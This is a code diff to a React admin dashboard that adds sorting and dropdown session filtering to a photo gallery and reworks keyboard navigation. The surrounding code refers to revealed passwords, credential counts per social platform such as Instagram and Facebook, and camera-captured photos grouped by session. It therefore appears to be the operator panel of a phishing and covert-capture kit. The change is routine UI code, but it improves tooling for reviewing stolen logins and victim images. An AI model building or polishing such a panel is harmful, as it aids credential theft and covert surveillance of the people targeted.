@@ -33,6 +33,8 @@ const TABS = [
   { id: 'analytics', label: 'Analytics', icon: BarChart3 },
 ] as const;
 
+type PhotoSort = 'newest' | 'oldest' | 'session' | 'source';
+
 const PLATFORM_STYLES: Record<string, string> = {
   instagram: 'bg-pink-50 text-pink-700 ring-pink-200',
   facebook: 'bg-blue-50 text-blue-700 ring-blue-200',
@@ -131,6 +133,7 @@ export default function AdminDashboard() {
   const [revealedPasswords, setRevealedPasswords] = useState<Record<string, boolean>>({});
   const [selectedPhoto, setSelectedPhoto] = useState<AdminPhoto | null>(null);
   const [sessionFilter, setSessionFilter] = useState('all');
+  const [photoSort, setPhotoSort] = useState<PhotoSort>('newest');
   const [lastUpdated, setLastUpdated] = useState<Date | null>(null);
   const adminToken = localStorage.getItem('adminToken') || '';
 
@@ -146,31 +149,6 @@ export default function AdminDashboard() {
     }, 5000);
     return () => clearInterval(interval);
   }, []);
-
-  useEffect(() => {
-    if (!selectedPhoto) {
-      return;
-    }
-
-    const onKeyDown = (event: KeyboardEvent) => {
-      if (event.key === 'Escape') {
-        setSelectedPhoto(null);
-        return;
-      }
-
-      const currentPhotos = sessionFilter === 'all' ? photos : photos.filter((photo) => photo.session_id === sessionFilter);
-      const currentIndex = currentPhotos.findIndex((photo) => photo.id === selectedPhoto.id);
-      if (event.key === 'ArrowRight' && currentIndex < currentPhotos.length - 1) {
-        setSelectedPhoto(currentPhotos[currentIndex + 1]);
-      }
-      if (event.key === 'ArrowLeft' && currentIndex > 0) {
-        setSelectedPhoto(currentPhotos[currentIndex - 1]);
-      }
-    };
-
-    window.addEventListener('keydown', onKeyDown);
-    return () => window.removeEventListener('keydown', onKeyDown);
-  }, [selectedPhoto, photos, sessionFilter]);
 
   const loadData = async (silent = false) => {
     const token = localStorage.getItem('adminToken');
@@ -251,10 +229,53 @@ export default function AdminDashboard() {
     [photos]
   );
 
-  const visiblePhotos = useMemo(
-    () => (sessionFilter === 'all' ? photos : photos.filter((photo) => photo.session_id === sessionFilter)),
-    [photos, sessionFilter]
-  );
+  const visiblePhotos = useMemo(() => {
+    const filtered =
+      sessionFilter === 'all' ? [...photos] : photos.filter((photo) => photo.session_id === sessionFilter);
+
+    const timeValue = (photo: AdminPhoto) => new Date(photo.capture_timestamp).getTime() || 0;
+    const sourceValue = (photo: AdminPhoto) =>
+      String(parsePhotoMetadata(photo.metadata).source || 'camera').toLowerCase();
+
+    filtered.sort((a, b) => {
+      if (photoSort === 'oldest') {
+        return timeValue(a) - timeValue(b);
+      }
+      if (photoSort === 'session') {
+        return a.session_id.localeCompare(b.session_id) || timeValue(b) - timeValue(a);
+      }
+      if (photoSort === 'source') {
+        return sourceValue(a).localeCompare(sourceValue(b)) || timeValue(b) - timeValue(a);
+      }
+      return timeValue(b) - timeValue(a);
+    });
+
+    return filtered;
+  }, [photos, sessionFilter, photoSort]);
+
+  useEffect(() => {
+    if (!selectedPhoto) {
+      return;
+    }
+
+    const onKeyDown = (event: KeyboardEvent) => {
+      if (event.key === 'Escape') {
+        setSelectedPhoto(null);
+        return;
+      }
+
+      const currentIndex = visiblePhotos.findIndex((photo) => photo.id === selectedPhoto.id);
+      if (event.key === 'ArrowRight' && currentIndex < visiblePhotos.length - 1) {
+        setSelectedPhoto(visiblePhotos[currentIndex + 1]);
+      }
+      if (event.key === 'ArrowLeft' && currentIndex > 0) {
+        setSelectedPhoto(visiblePhotos[currentIndex - 1]);
+      }
+    };
+
+    window.addEventListener('keydown', onKeyDown);
+    return () => window.removeEventListener('keydown', onKeyDown);
+  }, [selectedPhoto, visiblePhotos]);
 
   const platformCounts = analytics?.credentialsByPlatform || {};
   const maxPlatformCount = Math.max(1, ...Object.values(platformCounts).map((count) => Number(count) || 0));
@@ -463,32 +484,38 @@ export default function AdminDashboard() {
             <div className="p-4 md:p-6">
               {photos.length ? (
                 <>
-                  <div className="mb-4 flex flex-wrap items-center gap-2">
-                    <button
-                      type="button"
-                      onClick={() => setSessionFilter('all')}
-                      className={`rounded-full px-3 py-1.5 text-xs font-medium ring-1 transition ${
-                        sessionFilter === 'all'
-                          ? 'bg-purple-600 text-white ring-purple-600'
-                          : 'bg-white text-gray-600 ring-gray-200 hover:bg-purple-50'
-                      }`}
-                    >
-                      All sessions · {photos.length}
-                    </button>
-                    {sessionIds.map((sessionId) => (
-                      <button
-                        key={sessionId}
-                        type="button"
-                        onClick={() => setSessionFilter(sessionId)}
-                        className={`rounded-full px-3 py-1.5 text-xs font-medium ring-1 transition ${
-                          sessionFilter === sessionId
-                            ? 'bg-purple-600 text-white ring-purple-600'
-                            : 'bg-white text-gray-600 ring-gray-200 hover:bg-purple-50'
-                        }`}
-                      >
-                        {sessionId.slice(-8)} · {photos.filter((photo) => photo.session_id === sessionId).length}
-                      </button>
-                    ))}
+                  <div className="mb-4 flex flex-col gap-3 sm:flex-row sm:items-end sm:justify-between">
+                    <div className="flex flex-wrap gap-3">
+                      <label className="flex min-w-48 flex-col gap-1 text-xs font-medium text-gray-500">
+                        Filter by session
+                        <select
+                          value={sessionFilter}
+                          onChange={(event) => setSessionFilter(event.target.value)}
+                          className="rounded-lg border border-gray-200 bg-white px-3 py-2 text-sm text-gray-800"
+                        >
+                          <option value="all">All sessions ({photos.length})</option>
+                          {sessionIds.map((sessionId) => (
+                            <option key={sessionId} value={sessionId}>
+                              {sessionId.slice(-8)} ({photos.filter((photo) => photo.session_id === sessionId).length})
+                            </option>
+                          ))}
+                        </select>
+                      </label>
+                      <label className="flex min-w-48 flex-col gap-1 text-xs font-medium text-gray-500">
+                        Sort photos
+                        <select
+                          value={photoSort}
+                          onChange={(event) => setPhotoSort(event.target.value as PhotoSort)}
+                          className="rounded-lg border border-gray-200 bg-white px-3 py-2 text-sm text-gray-800"
+                        >
+                          <option value="newest">Newest first</option>
+                          <option value="oldest">Oldest first</option>
+                          <option value="session">Session</option>
+                          <option value="source">Source</option>
+                        </select>
+                      </label>
+                    </div>
+                    <p className="text-sm text-gray-500">{visiblePhotos.length} shown</p>
                   </div>
 
                   <div className="grid grid-cols-2 gap-3 sm:grid-cols-3 lg:grid-cols-4">
@@ -513,7 +540,9 @@ export default function AdminDashboard() {
                             </div>
                             <div className="absolute inset-x-0 bottom-0 bg-linear-to-t from-black/70 via-black/20 to-transparent p-3">
                               <p className="text-sm font-medium text-white capitalize">{source}</p>
-                              <p className="text-[11px] text-white/80">{formatTime(photo.capture_timestamp)}</p>
+                              <p className="text-[11px] text-white/80">
+                                {photo.session_id?.slice(-8)} · {formatTime(photo.capture_timestamp)}
+                              </p>
                             </div>
                           </div>
                         </button>
